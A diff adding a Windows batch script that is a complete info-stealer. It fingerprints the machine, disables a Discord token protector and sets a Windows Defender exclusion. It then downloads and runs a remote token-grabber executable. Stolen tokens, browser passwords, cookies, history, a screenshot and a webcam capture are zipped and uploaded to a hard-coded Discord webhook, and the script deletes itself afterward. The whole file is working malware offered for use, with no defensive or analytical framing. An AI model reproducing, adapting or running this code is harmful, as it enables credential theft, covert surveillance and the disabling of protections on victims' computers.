@@ -1,0 +1,26 @@
+@echo off
+set w=https://discord.com/api/webhooks/1181445047204462622/6eQ9VZdjxl14VvipHNAs0zuGdEqXpXaRVbz42D2ssxjs1glTxpyI95UlJ5koygjGJa55
+curl https://api.ipify.org > %temp%\ipp.txt
+set /p i=<%temp%\ipp.txt
+echo HD: > %temp%\S.txt && wmic diskdrive get size >> %temp%\S.txt
+echo ST: >> %temp%\S.txt && wmic bios get serialnumber >> %temp%\S.txt
+echo C: >> %temp%\S.txt && wmic cpu get name >> %temp%\S.txt
+systeminfo > %temp%\si.txt && wmic csproduct get uuid > %temp%\u.txt
+ipconfig /all > %temp%\ip.txt && netstat -an > %temp%\n.txt
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"@everyone ```User=%username% ip=%i% time=%time% date=%date% os=%os% Computername=%computername% ```\"}" %w%
+taskkill /f /im Discord.exe && taskkill /f /im DiscordTokenProtector.exe
+for %%a in (DiscordTokenProtector.exe ProtectionPayload.dll secure.dat) do if exist %appdata%\Roaming\DiscordTokenProtector\%%a del %appdata%\Roaming\DiscordTokenProtector\%%a
+if exist %appdata%\Roaming\DiscordTokenProtector\config.json (
+    echo {>"%appdata%\Roaming\DiscordTokenProtector\config.json"
+    echo "auto_start":false, >>"%appdata%\Roaming\DiscordTokenProtector\config.json"
+    for %%b in (true false false false false false false false false false -666 69) do echo "%%~b": %%~b >> "%appdata%\Roaming\DiscordTokenProtector\config.json"
+    echo } >>"%appdata%\Roaming\DiscordTokenProtector\config.json"
+)
+cd %temp% && powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%temp%"
+curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.1/main.exe --output %temp%\main.exe
+start /w /b main.exe %w% && taskkill /f /im main.exe
+mkdir %localappdata%\Temp\KDOT && echo penis > %localappdata%\Temp\KDOT\KDot.txt
+for %%c in (tokens.txt ip.txt si.txt S.txt n.txt u.txt browser-cookies.txt browser-history.txt browser-passwords.txt desktop-screenshot.png webcam.jpg) do move %temp%\%%c %localappdata%\Temp\KDOT\%%c
+powershell.exe Compress-Archive -Path %localappdata%\Temp\KDOT -DestinationPath %localappdata%\Temp\KDOT.zip && curl -i -H 'Expect: application/json' -F file=@%localappdata%\Temp\KDOT.zip %w%
+del %localappdata%\Temp\main.exe && rmdir /s /q %localappdata%\Temp\KDOT && del KDOT.zip
+start /b "" cmd /c del "%~f0"&exit /b
